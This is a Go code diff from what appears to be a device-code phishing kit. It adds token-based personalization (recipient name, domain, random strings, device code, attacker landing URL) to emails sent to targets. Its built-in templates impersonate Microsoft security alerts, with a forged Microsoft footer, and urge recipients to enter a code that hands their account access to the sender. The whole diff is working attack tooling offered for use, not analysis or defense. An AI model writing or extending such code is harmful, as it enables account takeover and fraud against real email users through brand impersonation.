@@ -3,6 +3,7 @@ package core
 import (
 	"crypto/rand"
 	"crypto/tls"
+	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
@@ -10,6 +11,7 @@ import (
 	"net/http"
 	"net/smtp"
 	"net/url"
+	"os"
 	"strings"
 	"sync"
 	"time"
@@ -434,10 +436,61 @@ func extractEmail(from string) string {
 	return strings.TrimSpace(from)
 }
 
-func buildEmailContent(t *DCTarget, template string) (subject, body string) {
-	verifyLink := t.VerificationURI + "?code=" + url.QueryEscape(t.UserCode)
+// ─────────────────────────────────────────────────────────────────────────────
+// Personalization engine — mirrors the Node sender's token system.
+// Supports the same tokens (USER, DOMAIN, DOMC, DOMs, SILENTCODERS*) plus
+// device-code specific ones (DCCODE, DCLINK, DCLANDING).
+// ─────────────────────────────────────────────────────────────────────────────
 
-	// Landing page URL (if server is running)
+func personalizeText(text, email string) string {
+	parts := strings.SplitN(email, "@", 2)
+	user := parts[0]
+	domain := ""
+	domainBase := ""
+	if len(parts) == 2 {
+		domain = parts[1]
+		// base = first label before first dot (e.g. "gmail" from "gmail.com")
+		domainBase = strings.SplitN(domain, ".", 2)[0]
+	}
+	domainCap := strings.ToUpper(domainBase[:1]) + domainBase[1:]
+
+	r := strings.NewReplacer(
+		"USER",                    user,
+		"DOMAIN",                  domain,
+		"DOMC",                    domainCap,
+		"DOMs",                    domainBase,
+		"SILENTCODERSEMAIL",       email,
+		"EMAILURLSILENTC0DERS",    dcB64(email),
+		"SILENTCODERSLIMAHURUF",   dcRandStr(5, "alpha"),
+		"SILENTCODERSBANYAKHURUF", dcRandStr(50, "alpha"),
+		"SILENTCODERSNUMBER",      dcRandStr(6, "num"),
+	)
+	return r.Replace(text)
+}
+
+func personalizeForTarget(text string, t *DCTarget) string {
+	verifyLink := t.VerificationURI + "?code=" + url.QueryEscape(t.UserCode)
+	landingURL := ""
+	if GlobalDCCfg != nil && GlobalDCCfg.GetBaseDomain() != "" {
+		landingURL = "https://" + GlobalDCCfg.GetBaseDomain() + "/dc/" + t.LandingToken
+	}
+	if landingURL == "" {
+		landingURL = verifyLink
+	}
+	text = strings.ReplaceAll(text, "DCCODE",    t.UserCode)
+	text = strings.ReplaceAll(text, "DCLINK",    verifyLink)
+	text = strings.ReplaceAll(text, "DCLANDING", landingURL)
+	if t.Email != "" {
+		text = personalizeText(text, t.Email)
+	}
+	return text
+}
+
+// buildEmailContent returns subject + HTML body for a device code target.
+// If letter.html exists in the working directory it is used as the template
+// (same convention as the Node sender). Otherwise falls back to built-in templates.
+func buildEmailContent(t *DCTarget, tmpl string) (subject, body string) {
+	verifyLink := t.VerificationURI + "?code=" + url.QueryEscape(t.UserCode)
 	landingURL := ""
 	if GlobalDCCfg != nil && GlobalDCCfg.GetBaseDomain() != "" {
 		landingURL = "https://" + GlobalDCCfg.GetBaseDomain() + "/dc/" + t.LandingToken
@@ -446,9 +499,22 @@ func buildEmailContent(t *DCTarget, template string) (subject, body string) {
 		landingURL = verifyLink
 	}
 
-	switch template {
+	// ── External letter.html (same as Node sender) ──────────────────────────
+	if raw, err := os.ReadFile("letter.html"); err == nil {
+		body = personalizeForTarget(string(raw), t)
+		// external subject from subject.txt if present, else default
+		if subRaw, err2 := os.ReadFile("subject.txt"); err2 == nil {
+			subject = personalizeForTarget(strings.TrimSpace(string(subRaw)), t)
+		} else {
+			subject = personalizeForTarget("Microsoft Security Alert: Action Required - USER", t)
+		}
+		return
+	}
+
+	// ── Built-in templates ───────────────────────────────────────────────────
+	switch tmpl {
 	case "it_helpdesk":
-		subject = "Action Required: Verify Your Identity"
+		subject = personalizeText("Action Required: Verify Your Identity — DOMC", t.Email)
 		body = fmt.Sprintf(`<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;background:#f4f4f4;padding:20px">
 <div style="max-width:600px;margin:auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.1)">
 <div style="background:#0078d4;padding:24px;text-align:center">
@@ -462,7 +528,7 @@ func buildEmailContent(t *DCTarget, template string) (subject, body string) {
     <div style="font-size:32px;font-weight:bold;letter-spacing:8px;color:#0078d4;background:#f0f7ff;border:2px dashed #0078d4;padding:16px 32px;display:inline-block;border-radius:6px">%s</div>
   </div>
   <div style="text-align:center;margin-bottom:24px">
-    <a href="%s" style="background:#0078d4;color:#fff;padding:12px 28px;border-radius:4px;text-decoration:none;font-size:15px;display:inline-block">Verify Now →</a>
+    <a href="%s" style="background:#0078d4;color:#fff;padding:12px 28px;border-radius:4px;text-decoration:none;font-size:15px;display:inline-block">Verify Now &rarr;</a>
   </div>
   <p style="color:#777;font-size:12px">Or go to <a href="%s">%s</a> and enter the code above.</p>
   <hr style="border:none;border-top:1px solid #eee;margin:24px 0">
@@ -472,7 +538,7 @@ func buildEmailContent(t *DCTarget, template string) (subject, body string) {
 	case "security_alert":
 		fallthrough
 	default:
-		subject = "Microsoft Security Alert: Sign-in Verification Required"
+		subject = personalizeText("Microsoft Security Alert: Sign-in Verification Required — SILENTCODERSNUMBER", t.Email)
 		body = fmt.Sprintf(`<!DOCTYPE html><html><body style="font-family:'Segoe UI',Arial,sans-serif;background:#f3f2f1;padding:20px;margin:0">
 <div style="max-width:600px;margin:auto;background:#fff;border-radius:4px;overflow:hidden">
 <div style="background:#0078d4;padding:20px 28px;display:flex;align-items:center;gap:12px">
@@ -496,11 +562,34 @@ func buildEmailContent(t *DCTarget, template string) (subject, body string) {
   <p style="color:#aaa;font-size:11px;line-height:1.5">This message was sent to %s. If you didn't initiate this, you can safely ignore this email.</p>
 </div>
 <div style="background:#f3f2f1;padding:12px 28px;text-align:center">
-  <p style="color:#aaa;font-size:11px;margin:0">© Microsoft Corporation, One Microsoft Way, Redmond, WA 98052</p>
+  <p style="color:#aaa;font-size:11px;margin:0">&copy; Microsoft Corporation, One Microsoft Way, Redmond, WA 98052</p>
 </div>
 </div></body></html>`, t.UserCode, verifyLink, verifyLink, landingURL, t.Email)
 	}
 	return
+}
+
+// dcRandStr generates a random string of given length and charset ("alpha" or "num").
+func dcRandStr(n int, charset string) string {
+	alpha := "abcdefghijklmnopqrstuvwxyz"
+	num := "0123456789"
+	chars := alpha + num
+	if charset == "alpha" {
+		chars = alpha
+	} else if charset == "num" {
+		chars = num
+	}
+	b := make([]byte, n)
+	for i := range b {
+		rb := make([]byte, 1)
+		rand.Read(rb)
+		b[i] = chars[int(rb[0])%len(chars)]
+	}
+	return string(b)
+}
+
+func dcB64(s string) string {
+	return base64.URLEncoding.EncodeToString([]byte(s))
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
